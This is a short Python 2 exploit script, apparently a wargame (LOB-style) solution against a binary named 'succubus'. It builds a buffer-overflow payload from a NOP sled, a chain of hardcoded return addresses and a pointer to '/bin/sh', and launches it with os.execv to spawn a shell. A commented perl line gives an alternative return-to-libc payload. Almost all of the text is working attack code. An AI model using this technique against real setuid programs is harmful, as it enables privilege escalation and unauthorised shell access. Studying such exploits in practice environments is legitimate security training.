import os

victim = "/home/zombie_assassin/succubus"
NOP = "\x90"*44
DO = "\xec\x87\x04\x08"
GYE = "\xbc\x87\x04\x08"
GUL = "\x8c\x87\x04\x08"
YUT = "\x5c\x87\x04\x08"
MO = "\x24\x87\x04\x08"
binsh = "\xa8\xfa\xff\xbf"#0xbffffa60 + 44 + 20 + 4 + 4

payload = NOP + DO + GYE + GUL + YUT + MO + "AAAA" + binsh + "/bin/sh"

print "[+] Victim : " + victim
print "[+] Loading payload..."
print "[+] Shellcode length : ", len(payload)
print

os.execv(victim, ("", payload))
#$(perl -e 'print "\x90"x44, "\x10\x84\x04\x08", "aaaa", "\xb0\xfa\xff\xbf", "\x49\xfc\xff\xbf"') $(perl -e 'print "\xe0\x8a\x05\x40", "\xe0\x91\x03\x40", "\xf9\xbf\x0f\x40"')